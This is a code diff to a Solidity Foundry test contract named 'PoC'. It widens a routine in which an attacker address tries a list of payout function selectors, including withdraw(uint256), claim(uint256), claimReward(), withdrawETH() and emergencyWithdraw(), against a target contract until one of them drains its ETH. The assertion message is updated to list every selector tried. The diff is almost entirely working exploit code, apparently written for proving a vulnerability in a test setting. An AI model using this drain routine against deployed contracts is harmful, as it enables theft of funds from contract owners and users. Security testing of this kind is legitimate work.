@@ -94,6 +94,26 @@ contract PoC is Test {
         if (bytes(used).length > 0) return used;
         used = _attempt(attacker, before, "withdrawAllETH()", abi.encodeWithSignature("withdrawAllETH()"));
         if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "withdraw(uint256)",
+            abi.encodeWithSignature("withdraw(uint256)", before)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "claim(uint256)",
+            abi.encodeWithSignature("claim(uint256)", before)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "claimReward()", abi.encodeWithSignature("claimReward()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "withdrawETH()", abi.encodeWithSignature("withdrawETH()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "emergencyWithdraw()", abi.encodeWithSignature("emergencyWithdraw()"));
+        if (bytes(used).length > 0) return used;
         return "";
     }
 
@@ -114,7 +134,7 @@ contract PoC is Test {
         assertGt(
             drained,
             0,
-            "no payout selector moved ETH out of the target. Tried withdraw(), claim(), drain(), withdrawAll(), sweep(), withdraw(address), withdrawTo(address), collect(), payout(), release(), rescueETH(uint256), rescueETH(), rescue(address,uint256), withdrawAllETH(). This does NOT establish safety: the payout may be guarded by an owner check, named differently, take other arguments, or be reachable only by a specific caller."
+            "no payout selector moved ETH out of the target. Tried withdraw(), claim(), drain(), withdrawAll(), sweep(), withdraw(address), withdrawTo(address), collect(), payout(), release(), rescueETH(uint256), rescueETH(), rescue(address,uint256), withdrawAllETH(), withdraw(uint256), claim(uint256), claimReward(), withdrawETH(), emergencyWithdraw(). This does NOT establish safety: the payout may be guarded by an owner check, named differently, take other arguments, or be reachable only by a specific caller."
         );
     }
 }
